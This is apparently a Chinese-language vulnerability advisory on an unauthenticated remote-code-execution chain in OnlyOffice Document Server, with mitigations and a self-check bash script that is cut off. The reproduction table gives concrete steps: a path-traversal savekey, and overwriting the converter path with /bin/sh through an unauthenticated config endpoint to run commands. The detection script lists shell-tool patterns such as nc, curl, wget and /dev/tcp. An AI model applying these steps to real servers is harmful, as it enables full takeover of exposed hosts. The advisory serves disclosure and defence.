---
title: 【漏洞通告】OnlyOffice Server前台RCE漏洞细节披露分析~【附自查脚本】
url: https://mp.weixin.qq.com/s/pexR4AkXoqmQpLTbVLQ2OA
source: Doonsec's feed
date: 2026-10-10
fetch_date: 2026-10-11T08:01:33.289181
---

# 【漏洞通告】OnlyOffice Server前台RCE漏洞细节披露分析~【附自查脚本】

# 【漏洞通告】OnlyOffice Server前台RCE漏洞细节披露分析~【附自查脚本】

FL\_Clover
FL\_Clover

网络安全007

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

一、 漏洞事件概述

    近期，两个月前某安全实验室披露了 OnlyOffice Document Server（一款广泛使用的开源在线办公协作套件）中存在一个极高危的远程代码执行（RCE）漏洞（编号：CNVD-2026-28199），其核心成因是系统在处理用户输入时缺乏严格校验，导致“路径穿越”与“配置注入”两个缺陷被恶意组合利用。攻击者可以在完全无需身份认证的前提下，篡改服务器底层运行配置，并最终在目标主机上执行任意系统命令，从而完全控制服务器。

![](https://mmbiz.qpic.cn/mmbiz_png/IGws6hSXN0yIX2uPVbSESsOYn4HpkdbnEWPvXEvOHOBteekqbBiaaebeV0AbumuSET94ia3spUAY2P11Eqx9kBKZWYN2mZnSWEyuovzJcmH34/640?wx_fmt=png&from=appmsg)

二、影响范围与前置条件判定

1. 版本维度

* 受影响：5.0 及以上全系列（含官方 Docker 镜像 onlyoffice/documentserver）。
* 差异点：
* 9.x：新增了可直接访问的配置端点，配置覆写后能被主动、即时加载，因此可形成完整主动利用链；已确认 9.0.0（Build 168）存在。
* 5.0 ~ 9.0 之间：缺少该配置端点，需依赖进程重启、服务重载等外部条件才能被动生效，利用稳定性差，但仍属受影响范围。
* 修复版本：升级至 9.1.0 及以上（原文口径；若条件允许，建议直接追到当前最新稳定版，因为 9.1 同时修复了数百个问题，包含本条链路的两个根因）。

2. 部署形态维度

| 部署形态 | 风险 |
| --- | --- |
| 直连后端 8000 端口（未走 nginx 反代） | `/info` 端点直接对外，默认即可打 |
| nginx 反代但把 `/info` 转发出去 | 同上，本地访问限制被绕开 |
| 标准 nginx 反代（`/info` 仅 allow 127.0.0.1） | 配置端点被挡住，但路径穿越写文件仍可能成立（仍可能被用于覆盖其他资源、配合其他缺陷） |
| 容器内挂载了 config 卷 / 以 root 运行容器 | 写入面更广，后果更重 |

3. 暴露面与行业分布

* 全球具备 OnlyOffice 指纹的记录约 19.7 万条 / 约 7 万个独立 IP；
* 国内约 8.4 万条 / 约 3 万个独立 IP；
* 资产指纹：app:"onlyoffice"

三、漏洞机理（攻击链拆解）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/IGws6hSXN0walRsFgV6q8Wd8xQbK4LEVfwfkdtzDQCmbkibHLNI8ib5BD1yEOnp0BiaAOfpmC4IicMLdmna8rmnRz7XyicEQIgbZWmxwmGyVb9U4/640?wx_fmt=png&from=appmsg)

| 环节 | 缺陷本质 | 是否可单独成事 | 与其他环节关系 |
| --- | --- | --- | --- |
| ① 写入原语 | `savekey` 未规范化，`path.join` 后无存储根断言 | 中危（任意目录写文件，文件名由服务端生成） | 默认链路里仅作探针；理论上可回写 Data 目录，是 ② 被阻断时的降级路径 |
| ② 配置注入 | `/info/config` 无鉴权、整份覆写 | 高危但需前置条件 | RCE 的直接入口；唯一屏障是 nginx IP 白名单 |
| ③ 信任错置 | 转换器可执行路径来自可信度不足的配置 | 不可单独成事 | 把“改配置”桥接为“改执行体”，使关键字过滤全部失效 |

3.1 写入原语 = 可控目录 + 服务端定名 + 原样内容

    实测落盘为 /tmp/pwn\_write/Editor1.txt，传入的 id=probe 未映射为文件名。反推逻辑为 存储根 + path.join(savekey, 服务端生成文件名)。因此攻击者能控制目录前缀与文件内容，但不能精确命中指定文件名。

    这决定了它难以精准覆盖已知文件名的目标，却足以完成探针验证、向 Web 可达目录投毒以及回写配置目录。防守侧排查应转向“异常目录下新建的常规扩展名文件”，而非仅搜索可疑脚本名。

3.2 /info/config 宽松到不校验 MIME

    使用 application/octet-stream 仍返回 200 并成功覆写；同时不做 JWT、不做会话、代码层来源校验默认关闭，且为整份覆写。

    这迫使攻击者必须先 GET 原始配置再修改——在日志里留下极清晰的取证线索（正常运维几乎不会对该端点发送大体积包），同时也让“打完自动还原”成为可能。

3.3 生效靠缓存 TTL，不是重启

    runtimeConfigManager 对运行期配置做带 TTL 的内存缓存，实测 ≤85s 重读磁盘，无需重启、无需新请求、无人交互。

    这是本漏洞静默且高危的根源。推论：注入与触发之间天然存在时间窗口，文件完整性监控抓 runtime.json 变更，是比抓命令执行更早、误报更低的检测点。

3.4 spawn 签名解释了所有参数切分现象

    调用形态近似 spawn("/bin/sh", ["-c", "<命令>", params.xml])。执行体被整体替换，; | $( ) 等注入符无用，常规命令注入规则全部失效；args 被展开成数组，params.xml 成为 $0。

    若把 args 写成 touch /tmp/x，shell 收到的 -c 后只有 touch 一词，于是报 missing file operand——这个报错出现在 converter 日志里，本身就是 Shell 已被拉起的独立旁证，在无回显场景下比反弹连接更可靠。

四、复现流程（仅供参考）

| 步骤 | 动作 | 实证 |
| --- | --- | --- |
| 前置判定 | GET `/info` 走 9880 与 8000 两口 | 判定可达性，决定后续走向 |
| Step 1 | POST `/downloadas/normal?cmd={c:"save",savekey:"../../..//tmp/pwn_write",format:"txt"}`，body 放唯一标记串 | 返回 `{"type":"save","status":"ok"}`；容器内 `/tmp/pwn_write/Editor1.txt` 内容等于请求体 |
| Step 2 | GET `/info` dump 原始配置 → 仅改 `FileConverter.converter.x2tPath="/bin/sh"`、`args="-c id>/tmp/pwned_rce_config_injection"` → 整份 POST `/info/config` | 200；`/var/www/onlyoffice/Data/runtime.json` 被覆写，属主 ds |
| Step 3 | 静置约 90s（热加载） | 无需任何人工干预 |
| Step 4 | 再发一次进转换队列的请求 | `cat /tmp/pwned_rce_config_injection` → `uid=105(ds) gid=107(ds) groups=107(ds)` |

复现过程坑点自查

| 现象 | 根因 | 处置 |
| --- | --- | --- |
| 返回 ok 但文件未落盘 | `savekey` 跳级层数不准，落到不存在的父目录 | 必须二次读回确认，不能信 status |
| 日志报 `missing file operand` / `not found` | `-c` 后的命令未作为一个完整字符串 | 已执行但未执行对，非未执行 |
| Step 2 返回 200 但配置未变 | 反代丢 body 或改写 Content-Type | 检查透传，抓包确认 |
| 注入成功但不执行 | 在 TTL 窗口内就发了触发请求，读到旧配置 | 间隔拉到 3 分钟重试 |
| 拿不到回显 | ds 低权、容器缺交互工具、出网受限 | 首轮改用 HTTP/DNS 外带确认 |

五、修复、加固、自查脚本

1.修复与加固

| 优先级 | 动作 | 验收方式 |
| --- | --- | --- |
| P0·小时级 | nginx 显式 `deny all` 封 `/info`、`/info/config`；禁止后端 8000 直曝公网 | 从外网 GET 返回 403 |
| P0·小时级 | `JWT_ENABLED=true` + 安装期自定义密钥；关闭 `EXAMPLE_ENABLED` | 无 token 请求返回 403 |
| P0·小时级 | 对 `runtime.json` 及所在目录做不可变标记 / 文件完整性监控 | 变更后 5 分钟内告警 |
| P1·版本级 | 升级至 9.1.0 及以上（同时修了路径穿越与配置鉴权） | 两条链路都复测，确认不是只修一处 |
| P2·架构级 | 输入层：`savekey`/`format`/`id` 做 `..` 剥离、绝对路径拒绝、白名单，`path.join` 后加“必须以存储根为前缀”断言 | 代码评审 + 单测 |
| P2·架构级 | 配置层：运行期配置写入端点强制认证 + 来源限制 + 变更审计 | 未鉴权 POST 返回 403 |
| P2·架构级 | 执行层：转换器可执行路径白名单（只允许预期 x2t 二进制被派生）；配合 seccomp/AppArmor 限制 execve | 篡改配置后转换任务报错而非执行 |
| P2·架构级 | 运行层：非 root 最小权限、容器只暴露必要端口、`/tmp`/Data/cache 评估 noexec 与定期清理 | 权限审计通过 |

2.自查脚本

    只读、无破坏、幂等可重复执行；优先查“配置是否被改”（最早、最准的检测点），其次查产物与日志；默认输出人类可读报告，支持 --json 供 SIEM 采集；含 --baseline 模式建立完整性基线，自行下载或更改后进行自查。

```
#!/usr/bin/env bash# oo-emergency-check.sh# ONLYOFFICE Document Server 应急核查脚本（只读 / 无破坏 / 可重复执行）# 用法：#   ./oo-emergency-check.sh                  # 全量检查，文本报告#   ./oo-emergency-check.sh --json           # JSON 输出，供 SIEM/流水线采集#   ./oo-emergency-check.sh --baseline       # 建立 runtime.json 基线（hash+权限+属主）#   ./oo-emergency-check.sh --verify         # 对照基线做完整性校验#   ./oo-emergency-check.sh --quick          # 只做 T0 三项（适合批量巡检）# 注意：本脚本不修复、不删除任何文件；--suggest 仅打印建议命令，需人工确认后执行。set -euo pipefailexport LC_ALL=C# ---------- 可配置项 ----------RUNTIME_JSON="/var/www/onlyoffice/Data/runtime.json"LOG_DIR="/var/log/onlyoffice/documentserver"CACHE_DIR="/var/lib/onlyoffice/documentserver/App_Data/cache/files/data"TMP_DIRS="/tmp /var/tmp"DS_UID="105"DS_GID="107"BASELINE_FILE="/var/lib/onlyoffice/.oo-runtime-baseline"NGINX_CONF_DIR="/etc/onlyoffice/documentserver"SHELL_PATTERN='/bin/(ba)?sh|python[0-9.]*|busybox|nc|netcat|curl|wget|perl|ruby'HOURS_BACK=168        # 日志/文件回溯窗口（小时）# ---------- 全局状态 ----------MODE="full"; OUT="text"; FINDINGS=(); RC=0declare -A SCORE=( [crit]=0 [high]=0 [med]=0 [low]=0 )log_find() { local lvl="$1" msg="$2"; FINDINGS+=("${lvl}:${msg}"); echo "[${lvl}] ${msg}"; }bump() { ((SCORE[$1]++)) || true; case "$1" in crit) RC=3;; high) ((RC<3))&&RC=2;; med) ((RC<2))&&RC=1;; esac; }file_exists() { [[ -e "$1" ]] && echo "1" || echo "0"; }# ---------- T0-1：运行期配置是否被篡改（最高信度） ----------check_runtime_config() {  echo "=== [T0-1] 运行期配置核查 ==="  [[ $(file_exists "$RUNTIME_JSON") == "0" ]] && { log_find "INFO" "runtime.json 不存在（路径可能随版本变化），跳过"; return 0; }  # 1) 权限/属主异常：不应被服务账户以外的主体可写  local perm owner  perm=$(stat -c '%a' "$RUNTIME_JSON" 2>/dev/null || echo "?")  owner=$(stat -c '%U:%G' "$RUNTIME_JSON" 2>/dev/null || echo "?")  echo "  路径: $RUNTIME_JSON  权限: $perm  属主: $owner"  if [[ "$perm" =~ ^[0-7]*[2367]$ ]]; then    log_find "MED" "runtime.json 对其他/同组可写($perm)，易被自身服务账户或同组进程污染"; bump med  fi  # 2) 基线对照（如果存在）  if [[ -f "$BASELINE_FILE" ]]; then    local now hash_now    hash_now=$(sha256sum "$RUNTIME_JSON" | awk '{print $1}')    if ! grep -q "^$hash_now " "$BASELINE_FILE"; then      log_find "CRIT" "runtime.json 与基线不一致（hash=$hash_now），疑似被篡改！"; bump crit    else      echo "  完整性: 与基线一致 ✓"; fi  else    echo "  完整性: 无基线（先用 --baseline 建立）"; fi  # 3) 核心：x2tPath / args 是否指向 shell 类程序  if command -v jq &>/dev/null; then    local xp ar    xp=$(jq -r '..|.x2tPath?//empty' "$RUNTIME_JSON" 2>/dev/null | tr '\n' ' ')    ar=$(jq -r '..|.args?//empty' "$RUNTIME_JSON" 2>/dev/null | tr '\n' ' ')    echo "  x2tPath: ${xp:-(not found)}"    echo "  args   : ${ar:-(not found)}"    if echo "$xp" | grep -qiE "$SHELL_PATTERN"; then      log_find "CRIT" "x2tPath 指向 shell 类程序：${xp} —— 高度疑似已被利用（CNVD-2026-28199）"; bump crit    fi    if echo "$ar" | grep -qiE '(^|[[:space:]])-c[[:space:]]|/tmp/|bash -i|/dev/tcp|curl .*http|wget .*http'; then      log_find "CRIT" "converter args 含可疑载荷特征：${ar}"; bump crit    fi    # 4) 结构健康度：缺少关键段说明是被不完整覆写过    if ! jq -e '.FileConverter?' "$RUNTIME_JSON" &>/dev/null; then      log_find "HIGH" "runtime.json 缺失 FileConverter 段，疑似被不完整配置覆写"; bump high    fi  else    log_find "INFO" "缺少 jq，改用 grep 降级检测（可能漏报）"    if grep -qiE '"x2tPath"[[:space:]]*:[[:space:]]*"/bin/(sh|bash)"' "$RUNTIME_JSON"; then      log_find "CRIT" "x2tPath 疑似被改为 /bin/sh 或 /bin/bash"; bump crit    fi  fi}# ---------- T0-2：/info 是否暴露在公网/非本机 ----------check_info_exposure() {  echo; echo "=== [T0-2] /info 暴露面核查 ==="  # 反代/官方 nginx 配置中是否有允许 info 的痕迹  if [[ -d "$NGINX_CONF...